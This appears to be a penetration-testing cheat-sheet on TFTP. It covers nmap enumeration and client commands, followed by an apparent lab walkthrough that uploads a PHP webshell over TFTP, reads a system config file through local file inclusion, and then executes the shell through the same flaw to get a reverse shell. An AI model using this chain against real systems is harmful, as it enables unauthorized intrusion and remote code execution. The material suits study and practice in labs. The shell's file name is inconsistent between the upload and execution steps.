## Intro
TFTP uses port 69/udp to establish the initial connection. The client and server then negotiate other ports for the data transfer process. 
FTP typically uses port 20/tcp (data) and 21/tcp (management), depending on its mode. 

## Detection with Nmap
```
sudo nmap -sU -p 69 --script tftp-enum <IP>
```

## tftp
```
# connect to tftp server
tftp <IP>

# THERE IS NO COMMAND TO LIST FILES

# Once connected, you can use the get command to download a file:
tftp> get config.txt

# To upload a file, you can use the put command:
tftp> put localfile.txt

# Finally, to exit the TFTP client, use the quit command:
tftp> quit
```
So TFTP can be abused to upload malicious file e.g. webshell and the abuse it with e.g. LFI.

## Example
```
# connect to tftp server and upload simple webshell
tftp <IP>
put shell.php

# Abuse LFI to learn where the files are stored
http://10.129.95.185/?file=/etc/default/tftpd-hpa
Result: # /etc/default/tftpd-hpa TFTP_USERNAME="tftp" TFTP_DIRECTORY="/var/lib/tftpboot" TFTP_ADDRESS=":69" TFTP_OPTIONS="-s -l -c"

# So files are stored here: /var/lib/tftpboot
# Let's abuse the LFI again to execute the webshell
http://10.129.95.185/?file=/var/lib/tftpboot/new_shell.php

# And we get reverse shell on our nc listener!
```
